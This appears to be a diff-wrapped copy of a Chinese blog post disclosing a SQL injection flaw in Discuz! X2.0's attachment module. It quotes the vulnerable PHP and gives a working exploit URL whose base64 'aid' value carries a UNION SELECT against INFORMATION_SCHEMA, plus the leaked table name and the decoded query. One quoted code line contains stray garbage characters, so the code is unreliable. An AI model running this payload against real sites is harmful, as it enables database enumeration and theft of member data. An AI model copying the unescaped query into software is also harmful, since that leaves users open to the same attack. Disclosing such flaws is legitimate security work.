@@ -1,0 +1,29 @@
+discuz!X2.0 SQL injection
+
+
+文件：source\module\forum\forum_attachment.php
+
+if(!defined('IN_DISCUZ')) { 
+exit('Access Denied');
+}
+define('NOROBOT', TRUE);
+@list($_G['gp_aid'], $_G['gp_k'], $_G['gp_t'], $_G['gp_uid'], $_G['gp_tableid']) = explode('|', base64_decode($_G['gp_aid']));
+
+if(!empty($_G['gp_findpost']) && ($attach = DB::fetch_first("SELECT pid, tid FROM ".DB::table('forum_attachment')." WHERE aid='$_G[gp_aid]'"))) {9 d3 c J: W& N) ~ H9 A$ ^
+dheader('location: forum.php?mod=redirect&goto=findpost&pid='.$attach['pid'].'&ptid='.$attach['tid']);
+};
+
+变量aid 直接base64_decode 后传入 SQL查询，造成注射漏洞。。。
+
+http://www.xxxx.net/aforum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsVEFCTEVfTkFNRSBmcm9tIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgd2hlcmUgVEFCTEVfU0NIRU1BPWRhdGFiYXNlKCkgYW5kICBUQUJMRV9OQU1FIGxpa2UgJyVfbWVtYmVyfHh8eHx4fHg%3D
+转向后网址
+http://www.xxxx.net/forum.php?mod=redirect&goto=findpost&pid=1&ptid=pre_common_admincp_member
+
+暴出表名 pre_common_admincp_member
+
+实际查询为： 
+$x="1' and 1=2 union all select 1,TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database() and TABLE_NAME like '%_member|x|x|x|x"; 
+//die (urlencode(base64_encode($x)));
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/908.html 
+
+
